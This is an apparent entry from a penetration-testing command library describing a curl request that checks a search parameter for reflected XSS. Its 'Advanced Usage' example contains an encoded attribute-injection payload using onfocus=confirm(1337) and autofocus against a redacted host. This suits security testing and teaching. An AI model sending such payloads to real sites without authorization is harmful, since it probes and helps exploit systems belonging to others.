---
data: 'curl -X GET "https://target.gov/search?q=payload" -v'
tags:
  - xss
  - web
  - testing
type: command
output: null
executor: bash
platforms:
  - Linux
  - macOS
  - Windows
created_at: '2023-10-01T00:00:00Z'
updated_at: '2025-12-14T03:16:08.347Z'
id: 1ff3c3ad-ad50-4945-8095-1f96268f8516
verified: false
validated: true
submitted: true
---
# Access-XSS-Test-URL

## Command

```bash
curl -X GET "https://target.gov/search?q=payload" -v
```

## Description

This command uses curl to send a GET request to a target URL with a payload in the query parameter, testing for reflection in the response. The -v flag provides verbose output to inspect headers and body for injected content. Use it to verify XSS payload reflection without executing JavaScript (which requires a browser).

## Parameters

| Parameter | Description | Required |
|-----------|-------------|----------|
| `-X GET` | Specifies HTTP GET method | Yes |
| `URL` | Target endpoint with parameter and payload | Yes |
| `-v` | Verbose mode for detailed request/response | No |

## Examples

### Basic Usage

```bash
curl -X GET "https://target.gov/search?q=test" -v
```

### Advanced Usage

```bash
curl -X GET "https://█████/██████=████%22%20o%3Cbr%3Eonfocus=confirm(1337)%20autofocus%20tabindex=1%20xss" -v
```

## Expected Output

Verbose curl output showing HTTP response, including the reflected payload in the HTML body (e.g., <input value="test payload">). Look for the injected attributes in the response to confirm vulnerability.

## Related

- [[Related Procedure: Inject-XSS-Payload-Using-onfocus-and-Autofocus]]
